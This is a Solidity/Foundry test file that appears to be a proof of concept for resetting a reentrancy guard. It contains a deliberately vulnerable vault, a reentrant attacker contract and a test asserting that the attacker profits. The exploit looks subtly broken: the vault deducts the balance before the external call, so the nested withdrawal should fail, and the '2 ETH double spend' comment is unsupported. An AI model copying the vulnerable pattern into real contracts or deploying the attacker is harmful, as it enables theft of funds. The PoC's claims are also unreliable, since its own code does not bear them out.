// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

/// @title Reentrancy Guard Reset PoC
/// @notice Demonstrates how receive() can reset a reentrancy guard
contract VulnerableVault {
    bool public sendingProgress;
    mapping(address => uint256) public balances;
    address public master;

    constructor() { master = msg.sender; }

    receive() external payable {
        if (msg.sender != address(0)) _sendValue(master, msg.value);
    }

    function _sendValue(address to, uint256 amt) internal {
        sendingProgress = true;
        (bool ok,) = payable(to).call{value: amt}("");
        sendingProgress = false; // ❌ resets guard on ALL paths
    }

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 amt) external {
        require(!sendingProgress, "reentrant");
        sendingProgress = true;
        require(balances[msg.sender] >= amt, "insufficient");
        balances[msg.sender] -= amt;
        (bool ok,) = msg.sender.call{value: amt}("");
        sendingProgress = false;
    }
}

contract GuardResetAttacker {
    VulnerableVault public vault;
    uint256 public attackCount;

    constructor(VulnerableVault _v) { vault = _v; }

    receive() external payable {
        if (attackCount < 1) {
            attackCount++;
            // Send 1 wei to vault → triggers receive() → resets sendingProgress
            payable(address(vault)).call{value: 1}("");
            // Now guard is reset, we can re-enter
            vault.withdraw(1 ether);
        }
    }

    function attack() external payable {
        vault.deposit{value: msg.value}();
        vault.withdraw(msg.value);
    }
}

contract GuardResetTest is Test {
    VulnerableVault vault;
    GuardResetAttacker attacker;

    function setUp() public {
        vault = new VulnerableVault();
        attacker = new GuardResetAttacker(vault);
        // Seed vault
        vm.deal(address(this), 10 ether);
        vault.deposit{value: 5 ether}();
    }

    function testGuardResetReentrancy() public {
        vm.deal(address(attacker), 2 ether);
        uint256 preBal = address(attacker).balance;
        attacker.attack{value: 1 ether}();
        uint256 postBal = address(attacker).balance;
        // Attacker deposited 1 ETH but withdrew 2 ETH (double spend)
        assertGt(postBal, preBal, "attacker should profit from reentrancy");
    }
}
